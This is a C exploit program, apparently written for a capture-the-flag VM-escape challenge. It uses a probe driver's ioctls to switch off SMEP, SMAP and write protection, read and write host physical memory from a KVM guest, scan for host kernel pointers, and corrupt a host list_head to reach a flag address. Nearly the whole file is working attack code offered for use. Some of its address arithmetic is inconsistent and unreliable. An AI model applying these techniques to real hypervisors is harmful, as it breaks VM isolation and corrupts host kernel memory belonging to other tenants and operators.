/*
 * VM Escape Pointer Corruption Exploit
 * 
 * Strategy: Find host pointers in accessible memory, corrupt them
 * to point to the flag address, then trigger host operations.
 * 
 * Key discovery: Guest physical 0x17bc34XXX maps to host physical 0x7bc34XXX
 * The host kernel direct map is at 0xffff888000000000
 * So host VA 0xffff88807bc34XXX = host phys 0x7bc34XXX = guest phys 0x17bc34XXX
 * 
 * Flag is at host physical 0x64279a8 = host VA 0xffff888064279a8
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_WRITE_PHYSICAL     0x101F

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
};

static int fd = -1;

int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return -1;
    }
    ioctl(fd, 0x1015, 0); // SMEP
    ioctl(fd, 0x1016, 0); // SMAP  
    ioctl(fd, 0x1017, 0); // WP
    return 0;
}

int read_phys(uint64_t addr, void *buf, size_t len) {
    struct physical_rw req = { .phys_addr = addr, .size = len, .user_buffer = buf };
    return ioctl(fd, IOCTL_READ_PHYSICAL, &req);
}

int write_phys(uint64_t addr, void *buf, size_t len) {
    struct physical_rw req = { .phys_addr = addr, .size = len, .user_buffer = buf };
    return ioctl(fd, IOCTL_WRITE_PHYSICAL, &req);
}

void hexdump(uint64_t addr, void *buf, size_t len) {
    unsigned char *p = buf;
    for (size_t i = 0; i < len; i += 16) {
        printf("0x%lx: ", addr + i);
        for (size_t j = 0; j < 16 && i + j < len; j++)
            printf("%02x ", p[i + j]);
        printf(" | ");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            char c = p[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("\n");
    }
}

/*
 * Convert host VA to guest physical address
 * Host direct map: 0xffff888000000000 + phys
 * For phys >= 0x100000000: guest_phys = phys
 * For phys < 0x100000000: need special handling
 */
uint64_t host_va_to_gpa(uint64_t host_va) {
    if ((host_va & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
        // Direct map address
        uint64_t host_phys = host_va & 0x0000ffffffffffffULL;
        // Subtract 0x888000000000 to get physical
        host_phys = host_va - 0xffff888000000000ULL;
        if (host_phys >= 0x100000000ULL) {
            return host_phys;  // Can access directly
        }
        // For lower addresses, add 0x100000000 prefix
        return 0x100000000ULL + host_phys;
    }
    return 0;
}

/*
 * Scan for linked list structures in PV clock area
 * The pointers at 0x17bc34030 and 0x17bc34060 look like list_head
 */
void analyze_list_structures(void) {
    printf("\n=== Analyzing List Structures ===\n");
    
    uint64_t base = 0x17bc34000;
    unsigned char buf[256];
    
    if (read_phys(base, buf, 256) != 0) {
        printf("Failed to read\n");
        return;
    }
    
    printf("Structure at 0x%lx:\n", base);
    hexdump(base, buf, 256);
    
    // Offset 0x30: list_head (next/prev pointing to self = empty list)
    uint64_t *list1_next = (uint64_t *)(buf + 0x30);
    uint64_t *list1_prev = (uint64_t *)(buf + 0x38);
    
    printf("\nList at +0x30:\n");
    printf("  next: 0x%016lx\n", *list1_next);
    printf("  prev: 0x%016lx\n", *list1_prev);
    
    // Offset 0x40: pointer to 0xffff8881180bb000
    uint64_t *ptr40 = (uint64_t *)(buf + 0x40);
    printf("\nPointer at +0x40: 0x%016lx\n", *ptr40);
    
    // Offset 0x60: another list_head
    uint64_t *list2_next = (uint64_t *)(buf + 0x60);
    uint64_t *list2_prev = (uint64_t *)(buf + 0x68);
    
    printf("\nList at +0x60:\n");
    printf("  next: 0x%016lx\n", *list2_next);
    printf("  prev: 0x%016lx\n", *list2_prev);
}

/*
 * Try to find what structure contains the PV clock page
 * by scanning backwards from known pointers
 */
void find_container_structure(void) {
    printf("\n=== Finding Container Structures ===\n");
    
    // The pointer 0xffff8881180bb000 was found in the PV clock area
    // Let's scan around it to find the full structure
    
    uint64_t targets[] = {
        0x1180bb000ULL - 0x1000,  // Before
        0x1180bb000ULL,           // The pointer target
        0x1180bb000ULL + 0x1000,  // After
    };
    
    for (int t = 0; t < 3; t++) {
        uint64_t gpa = targets[t];
        unsigned char buf[512];
        
        printf("\nScanning 0x%lx:\n", gpa);
        if (read_phys(gpa, buf, 512) != 0) {
            printf("  Failed to read\n");
            continue;
        }
        
        // Look for interesting patterns
        int found_ptrs = 0;
        for (int i = 0; i < 504; i += 8) {
            uint64_t val = *(uint64_t *)(buf + i);
            
            // Host kernel pointers
            if ((val & 0xffff888000000000ULL) == 0xffff888000000000ULL) {
                if (found_ptrs < 20) {
                    printf("  +0x%03x: 0x%016lx (direct map)\n", i, val);
                    found_ptrs++;
                }
            }
            // Kernel text pointers
            else if ((val & 0xffffffff80000000ULL) == 0xffffffff80000000ULL &&
                     (val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                if (found_ptrs < 20) {
                    printf("  +0x%03x: 0x%016lx (kernel text)\n", i, val);
                    found_ptrs++;
                }
            }
        }
    }
}

/*
 * The key insight: we found host memory is accessible!
 * Now let's do a targeted search for the flag value
 */
void targeted_flag_search(void) {
    printf("\n=== Targeted Flag Search ===\n");
    
    // Flag default value: 0xdeadbeef41424344
    // In memory (little endian): 44 43 42 41 ef be ad de
    uint64_t flag_le = 0xdeadbeef41424344ULL;
    uint8_t flag_bytes[] = {0x44, 0x43, 0x42, 0x41, 0xef, 0xbe, 0xad, 0xde};
    
    printf("Searching for flag pattern: 0x%016lx\n", flag_le);
    printf("Bytes: ");
    for (int i = 0; i < 8; i++) printf("%02x ", flag_bytes[i]);
    printf("\n");
    
    // Scan in chunks around accessible memory
    uint64_t scan_ranges[][2] = {
        // Around the PV clock area  
        {0x17bc30000ULL, 0x17bc40000ULL},
        // The 0x1180XX000 area
        {0x1180b0000ULL, 0x1180c0000ULL},
        // Try various offsets for flag physical address
        {0x164270000ULL, 0x164280000ULL},
        {0x106420000ULL, 0x106430000ULL},
        // Lower memory with 0x10 prefix
        {0x100000000ULL, 0x100100000ULL},
    };
    
    unsigned char buf[4096];
    
    for (int r = 0; r < 5; r++) {
        printf("\nScanning 0x%lx - 0x%lx:\n", scan_ranges[r][0], scan_ranges[r][1]);
        
        for (uint64_t addr = scan_ranges[r][0]; addr < scan_ranges[r][1]; addr += 4096) {
            if (read_phys(addr, buf, 4096) != 0) continue;
            
            for (int i = 0; i < 4096 - 8; i++) {
                if (memcmp(buf + i, flag_bytes, 8) == 0) {
                    printf("*** FLAG FOUND at 0x%lx + 0x%x = 0x%lx ***\n",
                           addr, i, addr + i);
                    hexdump(addr + i - 16, buf + i - 16, 48);
                }
            }
        }
    }
}

/*
 * Exploit: Corrupt a list pointer to redirect to flag
 * 
 * The list_head at 0x17bc34030 points to itself.
 * If we change it to point to (flag_addr - offsetof(list_head)),
 * when the kernel traverses this list it will read from flag memory.
 */
void corrupt_list_pointer(void) {
    printf("\n=== Attempting List Pointer Corruption ===\n");
    
    uint64_t list_addr = 0x17bc34030;
    uint64_t flag_host_va = 0xffff888064279a8ULL;
    
    unsigned char buf[16];
    
    // Read current list pointers
    if (read_phys(list_addr, buf, 16) != 0) {
        printf("Failed to read list\n");
        return;
    }
    
    uint64_t orig_next = *(uint64_t *)buf;
    uint64_t orig_prev = *(uint64_t *)(buf + 8);
    
    printf("Original list_head at 0x%lx:\n", list_addr);
    printf("  next: 0x%016lx\n", orig_next);
    printf("  prev: 0x%016lx\n", orig_prev);
    
    // The list points to itself - it's empty
    // If we corrupt 'next' to point elsewhere, list traversal will read that memory
    
    printf("\nCorrupting to point to flag area...\n");
    printf("Target: 0x%lx (flag host VA)\n", flag_host_va);
    
    // Calculate: if list traversal does container_of(next, struct xxx, list),
    // it will read from next - offset. We want it to land on the flag.
    
    // For now, let's try pointing directly to flag address
    uint64_t new_next = flag_host_va;
    uint64_t new_prev = flag_host_va;
    
    printf("Writing new_next = 0x%lx\n", new_next);
    
    // Backup first
    unsigned char backup[16];
    memcpy(backup, buf, 16);
    
    // Write corrupted pointer
    *(uint64_t *)buf = new_next;
    *(uint64_t *)(buf + 8) = new_prev;
    
    if (write_phys(list_addr, buf, 16) != 0) {
        printf("Failed to write\n");
        return;
    }
    
    printf("Written! Reading back...\n");
    
    unsigned char verify[16];
    if (read_phys(list_addr, verify, 16) == 0) {
        printf("Verification:\n");
        hexdump(list_addr, verify, 16);
    }
    
    printf("\n*** List corrupted! The host may now access flag memory ***\n");
    printf("Trigger a VM operation that traverses this list...\n");
    
    // Restore after a moment
    printf("\nRestoring original values...\n");
    write_phys(list_addr, backup, 16);
}

/*
 * Search for kvm_vcpu structure which contains the PV clock pointer
 */
void search_kvm_vcpu(void) {
    printf("\n=== Searching for kvm_vcpu Structure ===\n");
    
    // The PV clock page (0x17bc33000) should be referenced from kvm_vcpu
    // struct kvm_vcpu_arch has:
    //   struct gfn_to_hva_cache pv_time
    // which contains the GPA of the PV clock page
    
    // Search for the value 0x7bc33080 (the PV clock GPA / phys offset)
    uint64_t pv_clock_gpa = 0x7bc33080;  // Without the 0x1 prefix
    uint8_t search_bytes[8];
    *(uint64_t *)search_bytes = pv_clock_gpa;
    
    printf("Searching for PV clock GPA reference: 0x%lx\n", pv_clock_gpa);
    
    // Also search for the full GPA
    uint64_t pv_clock_full_gpa = 0x17bc33080;
    
    unsigned char buf[4096];
    uint64_t ranges[][2] = {
        {0x1180a0000ULL, 0x1180c0000ULL},
        {0x117bc30000ULL, 0x117bc40000ULL},
    };
    
    for (int r = 0; r < 2; r++) {
        printf("\nScanning 0x%lx - 0x%lx:\n", ranges[r][0], ranges[r][1]);
        
        for (uint64_t addr = ranges[r][0]; addr < ranges[r][1]; addr += 4096) {
            if (read_phys(addr, buf, 4096) != 0) continue;
            
            for (int i = 0; i < 4096 - 8; i += 8) {
                uint64_t val = *(uint64_t *)(buf + i);
                
                if (val == pv_clock_gpa || val == pv_clock_full_gpa) {
                    printf("Found PV clock reference at 0x%lx + 0x%x\n", addr, i);
                    hexdump(addr + i - 32, buf + i - 32, 96);
                }
            }
        }
    }
}

/*
 * Try to access host memory through EPT second-level translation
 * The host physical for flag is 0x64279a8
 * We need to find how to make guest access reach host physical 0x64279a8
 */
void explore_ept_mapping(void) {
    printf("\n=== Exploring EPT Mappings ===\n");
    
    // From the working accesses, we know:
    // Guest phys 0x17bc34030 -> Host phys 0x7bc34030 (verified by self-ptr)
    // 
    // So the mapping appears to be:
    // Guest phys 0x1XXXXXXXX = Host phys 0x0XXXXXXXX
    //
    // The flag is at host phys 0x064279a8
    // So we need guest phys 0x164279a8
    
    printf("Testing flag access patterns:\n");
    
    uint64_t test_addrs[] = {
        0x164279a8,      // Direct: 0x1 + 0x64279a8
        0x164279a0,      // Aligned
        0x1064279a8,     // With extra digit
        0x100000000 + 0x64279a8,  // 0x164279a8 again
    };
    
    unsigned char buf[64];
    
    for (int i = 0; i < 4; i++) {
        uint64_t addr = test_addrs[i];
        printf("\nTrying 0x%lx:\n", addr);
        
        if (read_phys(addr, buf, 64) == 0) {
            hexdump(addr, buf, 64);
            
            // Check for flag pattern
            uint64_t val = *(uint64_t *)buf;
            if (val == 0xdeadbeef41424344ULL) {
                printf("*** FLAG FOUND! ***\n");
            }
            
            // Also print the value
            printf("Value: 0x%016lx\n", val);
        } else {
            printf("Failed to read\n");
        }
    }
}

/*
 * Direct write attempt to flag location
 */
void attempt_flag_write(void) {
    printf("\n=== Attempting Direct Flag Write ===\n");
    
    uint64_t flag_gpa = 0x164279a8;
    
    // Read current value
    unsigned char buf[8];
    printf("Reading from 0x%lx...\n", flag_gpa);
    if (read_phys(flag_gpa, buf, 8) != 0) {
        printf("Read failed\n");
        return;
    }
    
    printf("Current value: ");
    for (int i = 0; i < 8; i++) printf("%02x ", buf[i]);
    printf("\n");
    
    // Try to write new value
    uint64_t new_value = 0x4141414141414141ULL;  // "AAAAAAAA"
    printf("Attempting to write 0x%lx...\n", new_value);
    
    if (write_phys(flag_gpa, &new_value, 8) != 0) {
        printf("Write failed\n");
        return;
    }
    
    // Read back
    unsigned char verify[8];
    if (read_phys(flag_gpa, verify, 8) == 0) {
        printf("After write: ");
        for (int i = 0; i < 8; i++) printf("%02x ", verify[i]);
        printf("\n");
        
        if (*(uint64_t *)verify == new_value) {
            printf("*** WRITE SUCCESSFUL! ***\n");
        }
    }
}

int main(int argc, char *argv[]) {
    if (init_driver() < 0) return 1;
    
    printf("VM Escape Pointer Corruption Exploit\n");
    printf("=====================================\n");
    
    if (argc < 2) {
        printf("\nUsage: %s <command>\n", argv[0]);
        printf("Commands:\n");
        printf("  list     - Analyze list structures\n");
        printf("  find     - Find container structures\n");
        printf("  flag     - Targeted flag search\n");
        printf("  corrupt  - Corrupt list pointer (DANGEROUS)\n");
        printf("  vcpu     - Search for kvm_vcpu\n");
        printf("  ept      - Explore EPT mappings\n");
        printf("  write    - Attempt direct flag write\n");
        printf("  all      - Run safe analyses\n");
        return 0;
    }
    
    if (strcmp(argv[1], "list") == 0) {
        analyze_list_structures();
    } else if (strcmp(argv[1], "find") == 0) {
        find_container_structure();
    } else if (strcmp(argv[1], "flag") == 0) {
        targeted_flag_search();
    } else if (strcmp(argv[1], "corrupt") == 0) {
        corrupt_list_pointer();
    } else if (strcmp(argv[1], "vcpu") == 0) {
        search_kvm_vcpu();
    } else if (strcmp(argv[1], "ept") == 0) {
        explore_ept_mapping();
    } else if (strcmp(argv[1], "write") == 0) {
        attempt_flag_write();
    } else if (strcmp(argv[1], "all") == 0) {
        analyze_list_structures();
        find_container_structure();
        explore_ept_mapping();
        attempt_flag_write();
    }
    
    close(fd);
    return 0;
}